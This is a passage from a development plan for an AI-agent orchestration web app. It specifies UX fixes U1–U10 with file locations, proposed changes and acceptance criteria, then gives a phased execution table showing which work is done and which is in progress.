  minute; `setInterval(60s)` drift can skip a minute boundary, silently
  losing that day's run. Fixed with a 5-minute grace window (still
  once-per-day; deliberately not retroactive across a server that was down
  at the scheduled time — cron semantics, not anacron).
- **A4** — CHANGELOG.md had no 0.2.0/Phase 7–8 entries; added.
- **A5** — USER_GUIDE.md didn't cover subscription quotas, scheduled runs,
  the GitHub-checks gate, or backups; added (two safety-model bullets plus
  "Scheduled runs" and "Backups & data" sections).

### U1. Global "action required" indicator in the nav — HIGH (the product's core promise)

**Where:** `apps/web/src/App.tsx` (the `NAV` row), data from
`GET /api/notifications` + the global `notification` WS events.

**Problem:** pending approvals — the one thing an unattended run genuinely
blocks on — are only visible in the Board's MissionControl strip or by
opening the Notifications tab. On any other page there is zero indication
that a run is sitting frozen waiting for a human tap.

**Fix:** a count badge on the "Notifications" nav item: number of
notifications with `requiresApproval` and no `respondedWith`. Seed it from
one fetch on mount; keep it live from the (already-global, see B15)
`notification` WS events and decrement on respond. Amber dot/count style
consistent with MissionControl's existing approval chip.

**Acceptance:** with a pending approval, every page shows the badge; tapping
through and responding clears it without a reload; zero pending = no badge
(not a "0").

### U2. Slim ProjectHeader outside the Board — HIGH (screen real estate)

**Where:** `apps/web/src/App.tsx` (renders `ProjectHeader` for every page in
`PROJECT_PAGES`), `apps/web/src/components/ProjectHeader.tsx`.

**Problem:** the full header — budget editor, Advanced config accordion,
Pause/Stop buttons — repeats at full size on Plan, Costs, Audit, and
Notifications, eating ~120px before each page's own content starts. Budget
and gate-config editing have nothing to do with reading the audit log.

**Fix:** give `ProjectHeader` a `compact` prop: one row (name, repo link,
status chip, Start/Pause/Stop). `App.tsx` passes `compact` for every
project page except Board. Board keeps the full editor.

**Acceptance:** Plan/Costs/Audit/Notifications show the one-row header with
working run controls; Board is unchanged; budget/config editing still
reachable on Board.

### U3. Board columns overflow with no affordance — HIGH

**Where:** `apps/web/src/pages/Board.tsx` (column list comes from
`TASK_STATUSES`).

**Problem:** 8 fixed-width columns at 1280px push CHANGES REQ., BLOCKED,
DONE, and FAILED past the right edge with no scroll hint — on first load it
looks like the board has 4–5 columns, and terminal columns (the ones that
tell you what finished/failed) are the hidden ones.

**Fix:** collapse *empty* columns to a slim vertical strip (rotated title +
count 0) that expands on click and on `dragover` (so drag-to-status still
works). Non-empty columns keep full width. Alternative acceptable
implementation: keep all 8 full-width but add a visible horizontal-scroll
affordance + auto-scroll to the busiest column; prefer the collapse.

**Acceptance:** with the mock seed (4 non-empty columns), all 8 states are
visible at 1280px without horizontal scrolling; dragging a card onto a
collapsed empty column still drops correctly; a column with cards never
collapses.

### U4. Unsaved Settings edits are silently discarded — HIGH (data loss)

**Where:** `apps/web/src/pages/Settings.tsx`, `apps/web/src/App.tsx`
(`{page === "settings" && <Settings />}` unmounts it on tab switch).

**Problem:** Settings is one long form (models, routing, budgets, Telegram)
with a Save button; switching to any other tab unmounts the component and
every unsaved edit vanishes without warning.

**Fix:** track dirty state in Settings (compare against the fetched
snapshot, the same dirty-check pattern ProjectHeader's budget row already
uses); expose it to App via a callback or module-level flag; on nav-away
while dirty, `window.confirm` ("Discard unsaved settings changes?") —
cancel keeps the user on Settings. Also make the Save row sticky at the
bottom of the viewport with a visible "unsaved changes" hint so the state
is obvious before it's a problem.

**Acceptance:** edit any field → switch tab → confirm dialog appears;
cancel stays with edits intact; save → switch is silent; the Save control
is visible without scrolling on a 800px-tall window.

### U5. MissionControl elapsed label reads "42s ago elapsed" — TRIVIAL

**Where:** `apps/web/src/components/MissionControl.tsx` (reuses TaskCard's
`agoLabel`, then appends "elapsed").

**Problem:** `agoLabel` returns "42s ago", producing the ungrammatical
"42s ago elapsed" on every active-agent row.

**Fix:** strip the "ago" for this usage — "elapsed 42s" (or "running for
42s"). One-line formatting change; don't change TaskCard's own usage.

**Acceptance:** an active agent row reads "elapsed 42s" (and "elapsed
2m 3s" past a minute).

### U6. Model-reassign dropdown on every kanban card — MEDIUM

**Where:** `apps/web/src/components/TaskCard.tsx` (full `<select>` of the
model roster on every card), `apps/web/src/components/TaskDrawer.tsx`.

**Problem:** every card carries the full model dropdown — visually the
heaviest element on the board, mostly disabled (active tasks can't be
reassigned), and an easy accidental-click target on the cards where it is
enabled.

**Fix:** replace the card's `<select>` with the plain model chip it already
shows elsewhere; move reassignment into TaskDrawer's Overview tab (same
enable/disable rules the card enforces today — only non-active tasks).

**Acceptance:** cards show a static model chip; reassigning from the drawer
updates the card live; active tasks can't be reassigned (control disabled
with the current model shown).

### U7. Schedules are invisible outside the accordion; disabling loses the times — MEDIUM (F19 follow-up)

**Where:** `apps/web/src/components/ProjectConfigFields.tsx`
(`projectConfigFromForm` drops `schedule` entirely when the enable checkbox
is off), `ProjectHeader.tsx` / `pages/ProjectsView.tsx` (no schedule
display anywhere).

**Problem:** (1) a configured schedule shows nowhere except inside the
Advanced accordion — nothing on the header or Projects page says "this
project auto-starts nightly at 03:00", which is exactly the kind of thing
that surprises you at 3am. (2) unchecking "enabled" and saving deletes the
whole schedule object, so re-enabling later starts from blank inputs.

**Fix:** (1) when a schedule exists and is enabled, show a small chip on
ProjectHeader (both variants, see U2) and on the ProjectsView row: "⏱ daily
03:00" / "⏱ every 6h". (2) `projectConfigFromForm`: when the checkbox is
off but times/interval are filled in, emit `{ enabled: false, …times }`
instead of omitting `schedule` — the scheduler already ignores disabled
schedules (`isScheduleDue` checks `enabled` first), so persisting them is
free.

**Acceptance:** an enabled schedule is visible on the header and Projects
row; disable → save → re-enable round-trips the configured times; a
never-configured project shows no chip.

### U8. Headline costs render as "$0.0000" — LOW

**Where:** `apps/web/src/pages/CostView.tsx` (stat tiles),
`apps/web/src/components/BoardSummary.tsx` ("$0.0000 spent").

**Problem:** four-decimal precision makes sense for a $0.0034 per-task
cost, but headline tiles ("Total spend", the board's "spent" figure)
reading "$0.0000" look broken rather than precise.

**Fix:** one shared `formatUsd(n)` helper (e.g. in `apps/web/src/lib/` or
next to the api client): `>= $0.01` → 2 decimals; `> 0` and `< $0.01` → 4
decimals; `0` → "$0.00". Use it for headline stats and the board summary;
keep 4-decimal precision on per-task/per-run rows where sub-cent amounts
are the norm.

**Acceptance:** a fresh project's board reads "$0.00 spent"; a $0.0034 task
row still shows "$0.0034"; a $1.234567 total shows "$1.23".

### U9. "New Project" is a nav tab though it's an action — LOW

**Where:** `apps/web/src/App.tsx` (`NAV` array + the top row with the
project selector).

**Problem:** the tab row mixes places (Board, Costs…) with an action (New
Project), and the action also appears as a button in empty states — two
ways in, one of them pretending to be a page.

**Fix:** remove `new-project` from `NAV`; add a small "+ New" button next
to the project selector in the top row (it's an app-level action, so it
belongs with the app-level selector). The `page` state keeps supporting
`"new-project"` — only the affordance moves. While in there, visually
separate project-scoped tabs (Board…Notifications) from global ones
(Projects/Settings/Setup) with a divider.

**Acceptance:** New Project reachable from every page via the top-row
button; the tab list has 8 entries; empty-state buttons still work.

### U10. Dependency chips truncate with no full-title affordance — TRIVIAL

**Where:** `apps/web/src/components/TaskCard.tsx` (the "blocked by …"
chips).

**Problem:** chips ellipsize ("blocked by Orchestrator eng…") and there's
no hover/tooltip to read the full dependency title.

**Fix:** `title` attribute with the full task title on each chip.

**Acceptance:** hovering a truncated chip shows the full title.

### What the walkthrough did NOT flag (for calibration)

The narrow/phone layout genuinely holds up (the two-row nav and full-width
cards adapt cleanly — F4's layout comments paid off); Setup & Health is the
strongest page in the app; empty states (Audit, Notifications) are clear;
the TaskDrawer and TokenGate are clean. The wave above is polish on a
fundamentally sound UI, not a redesign.

### Beyond the UX wave (not specced — decide when U1–U10 land)

- **F13 phase 1 — gates-only sandbox**, per `docs/specs/sandbox.md`'s
  phased rollout. The biggest remaining security-posture item.
- **A real `@orc/server` test package.** The only workspace with no test
  script. `scheduler.ts`, `budget.ts`, and `db/backup.ts` are pure or
  near-pure and already have exactly-shaped standalone-script verifications
  from Phases 5–9 to port into `node --test` files; wire into CI's existing
  test steps.
- **Quota usage in SetupView's model-health panel** — F16's explicitly
  skipped nice-to-have ("N runs / $X used this window").
- **v0.2.0 tagged** with this Part's docs PR; keep tagging at wave
  boundaries.

---

## Suggested execution order

| Phase | Items | Rationale | Status |
|---|---|---|---|
| 1 | S1, S2, S3, S4 | Close the injection/exposure holes before anything else touches the network surface. | ✅ done |
| 2 | B1, B2, B3, B4, B5 | The control-plane bugs users hit daily (stop, logs, double-run, run rows, status). | ✅ done |
| 3 | S5, B6–B15 | Hygiene + rails; each is small and independent. | ✅ done |
| 4 | F1, F2, F3, F4 | Core product loop: onboard → understand → intervene → observe. | ✅ done |
| 5 | F5, F6, F7, F8 | Away-from-keyboard autonomy story. | ✅ done |
| 6 | F9, F10, F11, F12 | Per-repo flexibility, packaging, docs. | ✅ done |
| 7 | B16, B17, B18, B19, S6 | Review-pass fixes: confirmed defects in the shipped Phase 6 work. Fix before Phase 8. | ✅ done |
| 8 | F14, F15, F16, F17, F18, F19 | Second feature wave: CI first (F14 — every later PR benefits), then external-CI gate, quota awareness, backups, sandbox doc, scheduled runs (F19 opted into 2026-07-06). | ✅ done |
| 9 | A1–A5 (done), U1–U10 | Post-plan audit fixes, then the UX wave from the full-app walkthrough — badge/header/board layout first (U1–U4 are the high-impact ones), trivial polish after. | 🔄 in progress |

Each phase = one or a few PRs. Keep PRs scoped to items; reference the item IDs
(S1, B4, F3…) in commit messages so the audit trail maps back to this plan.

Parts 1, 2, and 3 (Phases 1–8) are **all done** — Phases 1–6 tagged
`v0.1.0`, Phases 7–8 plus the post-plan audit fixes tagged `v0.2.0`. Part 4
(Phase 9) is the active work: the audit items A1–A5 are already fixed;
U1–U10 are next, top-down. F13 remains future work — F18 covers its design
doc only, and Part 4's "Beyond the UX wave" list is where to look after
U10. Fable independently re-verifies each wave after merge; verification
evidence is in each item's PR description and in this doc's Progress
section above.
